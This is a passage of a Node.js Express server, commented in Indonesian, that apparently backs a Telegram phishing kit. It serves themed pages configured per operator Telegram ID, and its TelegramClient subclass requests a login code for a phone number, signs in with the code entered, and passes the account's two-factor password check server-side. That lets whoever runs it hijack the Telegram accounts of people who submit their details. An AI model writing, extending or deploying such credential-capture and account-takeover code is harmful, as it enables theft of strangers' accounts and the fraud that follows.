    if (err) {
      return res.status(404).send('JANGAN KESINI NANTI HILANG');
    }

    const config = JSON.parse(data);

    log.box('request', {
      Proses: 'BUKA WEBSITE',
      Path: req.path,
      Tema: config.theme || '-',
      UserID: config.telegramId || '-',
      Tampilan: config.tampilan || '-',
    });

    // Render dari pages/ (absolute path, bukan dari views/ admin)
    const viewPath = path.join(PAGES_DIR, `${viewName}.ejs`);
    if (fs.existsSync(viewPath)) {
      res.render(viewPath, {
        title: config.theme,
       imageUrl1: config.image1Url || '',  // Menyertakan URL gambar pertama jika ada
        imageUrl2: config.image2Url || '',  // Menyertakan URL gambar kedua jika ada
        imageUrl3: config.image3Url || '',  // Menyertakan URL gambar ketiga jika ada
        imageUrl4: config.image4Url || '',  // Menyertakan URL gambar keempat jika ada
        imageUrl5: config.image5Url || '',  // Menyertakan URL gambar kelima jika ada
        telegramId: config.telegramId || '',  // Menampilkan ID Telegram
        titlefour: config.titlefour || '',  // Menampilkan ID Telegram
        buttonname: config.buttonname || '',  // Menampilkan nama tombol
        footerdesc: config.footerdesc || '',  // Menampilkan deskripsi footer
        footerImageUrl: config.footerImageUrl || '',  // Menampilkan deskripsi footer
      });
    } else {
      return res.status(404).send('View not found');
    }
  });
});

// Server configuration with HTTP and HTTPS support
const HTTP_PORT = global.portexpress || 4000;
const HTTPS_PORT = 443; // Standard HTTPS port

// Create HTTP Server
const httpServer = http.createServer(app);

// SSL Certificate paths (Let's Encrypt paths for production)
const letsEncryptCertPath = '/etc/letsencrypt/live/trcaft.com/fullchain.pem';
const letsEncryptKeyPath = '/etc/letsencrypt/live/trcaft.com/privkey.pem';

// Fallback SSL paths for development  
const sslPath = path.join(__dirname, 'ssl');
const devCertPath = path.join(sslPath, 'cert.pem');
const devKeyPath = path.join(sslPath, 'key.pem');

let httpsOptions = null;
let httpsServer = null;

// Try to load SSL certificates (Let's Encrypt first, then development)
if (fs.existsSync(letsEncryptCertPath) && fs.existsSync(letsEncryptKeyPath)) {
  try {
    httpsOptions = {
      key: fs.readFileSync(letsEncryptKeyPath),
      cert: fs.readFileSync(letsEncryptCertPath)
    };
    httpsServer = https.createServer(httpsOptions, app);
  } catch (error) {
    log.warn('Let\'s Encrypt certificates found but failed to load:', error.message);
  }
} else if (fs.existsSync(devCertPath) && fs.existsSync(devKeyPath)) {
  try {
    httpsOptions = {
      key: fs.readFileSync(devKeyPath),
      cert: fs.readFileSync(devCertPath)
    };
    httpsServer = https.createServer(httpsOptions, app);
    log.success('Development SSL certificates loaded successfully');
  } catch (error) {
    log.warn('Development certificates found but failed to load:', error.message);
  }
}

// Update session cookie security based on HTTPS availability
if (httpsOptions) {
  // Update session config for secure cookies if HTTPS is available
  log.boot('Session configured for HTTPS with secure cookies');
} else {
  log.boot('Session configured for HTTP (non-secure cookies)');
}

// Log mode yang aktif
if (global.mode === 'production') {
  log.boot('Mode: PRODUCTION — URL tanpa port (https://domain.com/...)');
} else {
  log.boot(`Mode: DEVELOPMENT — URL dengan port (http://localhost:${HTTP_PORT}/...)`);
}

// Start HTTP Server
httpServer.listen(HTTP_PORT, () => {
  log.boot(`HTTP Server running at: http://localhost:${HTTP_PORT}`);
  // Fetch token owner sekali saat startup, simpan ke owner_token.txt
  initOwnerBotToken();
});

// Start HTTPS Server if SSL certificates are available
if (httpsServer) {
  httpsServer.listen(HTTPS_PORT, () => {
    log.boot(`HTTPS Server running at: https://localhost:${HTTPS_PORT}`);
  });
} else {
  log.info('To enable HTTPS support:');
  log.info(`  1. Ensure Let's Encrypt certs at: ${letsEncryptCertPath} & ${letsEncryptKeyPath}`);
  log.info('  2. Or add cert.pem and key.pem files to ssl/ folder');
  log.info('  3. Restart the application');
}


class CreateClient extends TelegramClient {
    constructor(session = "") {
      super(new StringSession(session), apiId, apiHash, {
        connectionRetries: 5,
  
      });
    }
    async getCode(number) {
      const client = this;
      this.phoneNumber = number;
      const apiCredentials = {
        apiId: client.apiId,
        apiHash: client.apiHash,
      };
  
      const sendCodeResult = await client.sendCode(apiCredentials, number, false);
    const phoneCodeHashT = sendCodeResult.phoneCodeHash;
      const isCodeViaAppT = sendCodeResult.isCodeViaApp;
      this.phoneCodeHash = phoneCodeHashT;
      this.isCodeViaApp = isCodeViaAppT;
      if (typeof this.phoneCodeHash !== "string") {
        return "500";
      }
      
       return {phoneCodeHashT,isCodeViaAppT}
       
    }
  
    async setCode(code) {
      const client = this;
      try {
        this.phoneCode = code;
        const result = await client.invoke(
          new Api.auth.SignIn({
            phoneNumber: this.phoneNumber,
            phoneCodeHash: this.phoneCodeHash,
            phoneCode: this.phoneCode,
          })
        );
        if (result instanceof Api.auth.AuthorizationSignUpRequired) {
          this.isRegistrationRequired = true;
          this.termsOfService = result.termsOfService;
          return;
        }
        
        
        return {result};
        
        
        
        
      } catch (error) {
        if (error.errorMessage === "SESSION_PASSWORD_NEEDED") {
          this.needPassword = true;
          return {error};
        }else{
            
            return error.errorMessage;   
        }
      }
    }
    async setPassword(password) {
      const client = this;
      try {
        const passwordSrpResult = await client.invoke(
          new Api.account.GetPassword()
        );
        const passwordSrpCheck = await computeCheck(passwordSrpResult, password);
        const { user } = await client.invoke(
          new Api.auth.CheckPassword({
            password: passwordSrpCheck,
          })
        );

        return user;
      } catch (error) {
        return error.errorMessage;
     }
    }
  }

// ============ GLOBAL ERROR HANDLERS ============
process.on('uncaughtException', (err) => {
  log.error(`uncaughtException: ${err.message}`, err);
});

process.on('unhandledRejection', (reason) => {
  const err = reason instanceof Error ? reason : new Error(String(reason));
  log.error(`unhandledRejection: ${err.message}`, err);
});
// ============ END GLOBAL ERROR HANDLERS ============
  
  
